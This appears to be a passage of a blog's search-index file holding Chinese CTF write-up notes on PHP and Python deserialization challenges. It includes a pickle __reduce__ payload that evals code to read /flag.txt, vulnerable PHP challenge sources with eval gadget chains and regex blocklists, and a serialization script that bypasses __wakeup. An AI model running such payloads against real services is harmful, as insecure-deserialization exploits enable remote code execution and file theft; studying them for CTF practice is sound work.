<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;, &#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = test()</span><br><span class="line">s=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(s))</span><br></pre></td></tr></table></figure>

<p>应该在python2环境下运行,修改become获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    class Welcome&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        public $arg = &#x27;oww!man!!&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;name = &#x27;ItS SO CREAZY&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;name == &#x27;welcome_to_NKCTF&#x27;)&#123;</span><br><span class="line">                echo $this-&gt;arg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function waf($string)&#123;</span><br><span class="line">        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $string))&#123;</span><br><span class="line">            die(&quot;you are bad&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Happy&#123;</span><br><span class="line">        public $shell;</span><br><span class="line">        public $cmd;</span><br><span class="line">        public function __invoke()&#123;</span><br><span class="line">            $shell = $this-&gt;shell;</span><br><span class="line">            $cmd = $this-&gt;cmd;</span><br><span class="line">            waf($cmd);</span><br><span class="line">            eval($shell($cmd));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Hell0&#123;</span><br><span class="line">        public $func;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            $function = $this-&gt;func;</span><br><span class="line">            $function();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;p&#x27;]))&#123;</span><br><span class="line">        unserialize($_GET[&#x27;p&#x27;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>做题笔记之DASCTF2022-BlogSystem</title>
    <url>/2023/04/17/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0%E4%B9%8BDASCTF2022-BlogSystem/</url>
    <content><![CDATA[<h1 id="FLASK伪造-目录穿越-PyYAML反序列化漏洞"><a href="#FLASK伪造-目录穿越-PyYAML反序列化漏洞" class="headerlink" title="FLASK伪造+目录穿越+PyYAML反序列化漏洞"></a>FLASK伪造+目录穿越+PyYAML反序列化漏洞</h1><p>上传文件时，PHP会在服务器上创建一个临时文件，用于暂时存储上传的文件内容，在文件上传完成后再将其移动到目标位置。</p>
]]></content>
  </entry>
  <entry>
    <title>5.1GKCTF</title>
    <url>/2023/05/01/5-1GKCTF/</url>
    <content><![CDATA[<p>1.源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function waf($string)&#123;</span><br><span class="line">    if(preg_match(&#x27;/f|l|a|g|\*|\?|dir|system|sed/i&#x27;, $string))&#123;</span><br><span class="line">        die(&quot;you are bad&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class  A&#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public $f;</span><br><span class="line">    </span><br><span class="line">    public function shell($cmd)&#123;</span><br><span class="line">        $func=$this-&gt;f;</span><br><span class="line">      waf($cmd);</span><br><span class="line">        eval($func($cmd));</span><br><span class="line">    &#125;</span><br><span class="line">    public  function __toString()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;shell($this-&gt;var);</span><br><span class="line">        return &#x27;1&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class  B&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $user;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $fun=$this-&gt;user;</span><br><span class="line">        $fun();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $vi;</span><br><span class="line">    public $vm;</span><br><span class="line">    public $ua;</span><br><span class="line">    public $ub;</span><br><span class="line">    public function __set($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        $this-&gt;vi-&gt;vm;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        $this-&gt;ua-&gt;ghOst=&#x27;JAVA之神&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class D&#123;</span><br><span class="line">    public $va;</span><br><span class="line">    public $vb;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        $this-&gt;va-&gt;vb();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<p>2.源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;./flag.php&#x27;);</span><br><span class="line">class Sekai_Game&#123;</span><br><span class="line">    public $start ;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;b=$this-&gt;a;</span><br><span class="line">        if($this-&gt;start === &#x27;i_am_pop_god&#x27;)&#123;</span><br><span class="line">            echo &quot;Sekai Game Start Here is your flag &quot;.getenv(&#x27;FLAG&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;start=&#x27;nonono too yong too simple&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;sekai_game.run&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;sekai_game.run&#x27;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>为了使$this-&gt;start赋值为i_am_pop_god，需要绕过__wakeup()方法</p>
<p>通过引用绕过，：给$a&#x3D;&amp;$b,改变$b的时候就会改变$a，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sekai_Game&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hsez=new Sekai_Game();</span><br><span class="line">$hsez-&gt;a=&#x27;i_am_pop_god&#x27;;</span><br><span class="line">$hsez-&gt;start=&amp;$hsez-&gt;b;</span><br><span class="line">print_r(@serialize($hsez));</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
</search>
